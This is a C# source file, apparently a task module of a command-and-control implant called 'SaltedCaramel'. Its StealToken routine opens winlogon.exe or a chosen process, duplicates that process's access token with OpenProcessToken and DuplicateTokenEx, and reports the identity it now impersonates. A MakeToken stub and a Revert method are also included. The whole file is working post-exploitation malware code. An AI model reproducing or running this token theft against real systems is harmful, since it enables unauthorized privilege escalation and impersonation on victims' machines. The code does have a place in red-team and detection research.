﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SaltedCaramel.Tasks
{
    public class Token
    {
        public static IntPtr stolenHandle;

        public static void Execute(SCTaskObject task)
        {
            if (task.command == "steal_token")
            {
                StealToken(task);
            }
            else if (task.command == "make_token")
            {
                MakeToken(task);
            }
        }

        public static void MakeToken(SCTaskObject task)
        {
            string user = task.@params.Split(' ')[0];
            string pass = task.@params.Split(' ')[1];
        }

        public static void StealToken(SCTaskObject task)
        {
            try
            {
                int procId;
                IntPtr procHandle;
                if (task.@params == "")
                {
                    Process winlogon = Process.GetProcessesByName("winlogon")[0];
                    procHandle = winlogon.Handle;
                    Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
                }
                else
                {
                    procId = Convert.ToInt32(task.@params);
                    procHandle = Process.GetProcessById(procId).Handle;
                    Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
                }

                try
                {
                    // Stores the handle for the original process token
                    stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token

                    // Get handle to target process token
                    bool procToken = Win32.Advapi32.OpenProcessToken(
                        procHandle,                                 // ProcessHandle
                        (uint)TokenAccessLevels.MaximumAllowed,     // desiredAccess
                        out IntPtr tokenHandle);                           // TokenHandle

                    if (!procToken) // Check if OpenProcessToken was successful
                        throw new Exception(Marshal.GetLastWin32Error().ToString());

                    Debug.WriteLine("[+] StealToken - OpenProcessToken: " + procToken);

                    try
                    {
                        // Duplicate token as stolenHandle
                        bool duplicateToken = Win32.Advapi32.DuplicateTokenEx(
                            tokenHandle,                                    // hExistingToken
                            (uint)TokenAccessLevels.MaximumAllowed,         // dwDesiredAccess
                            IntPtr.Zero,                                    // lpTokenAttributes
                            (uint)TokenImpersonationLevel.Impersonation,    // ImpersonationLevel
                            Win32.Advapi32.TOKEN_TYPE.TokenPrimary,         // TokenType
                            out stolenHandle);                              // phNewToken

                        if (!duplicateToken) // Check if DuplicateTokenEx was successful
                            throw new Exception(Marshal.GetLastWin32Error().ToString());

                        Debug.WriteLine("[+] StealToken - DuplicateTokenEx: " + duplicateToken);

                        WindowsIdentity ident = new WindowsIdentity(stolenHandle);
                        Debug.WriteLine("[+] StealToken - Successfully impersonated " + ident.Name);
                        Win32.Kernel32.CloseHandle(tokenHandle);
                        Win32.Kernel32.CloseHandle(procHandle);

                        task.status = "complete";
                        task.message = "Successfully impersonated " + ident.Name;
                        ident.Dispose();
                    }
                    catch (Exception e) // Catch errors thrown by DuplicateTokenEx
                    {
                        Debug.WriteLine("[!] StealToken - ERROR duplicating token: " + e.Message);
                        task.status = "error";
                        task.message = e.Message;
                    }
                }
                catch (Exception e) // Catch errors thrown by OpenProcessToken
                {
                    Debug.WriteLine("[!] StealToken - ERROR creating token handle: " + e.Message);
                    task.status = "error";
                    task.message = e.Message;
                }
            }
            catch (Exception e) // Catch errors thrown by Process.GetProcessById
            {
                Debug.WriteLine("[!] StealToken - ERROR creating process handle: " + e.Message);
                task.status = "error";
                task.message = e.Message;
            }
        }
        public static void Revert(SCTaskObject task)
        {
            Win32.Kernel32.CloseHandle(stolenHandle);
            stolenHandle = IntPtr.Zero;
            task.status = "complete";
        }
    }
}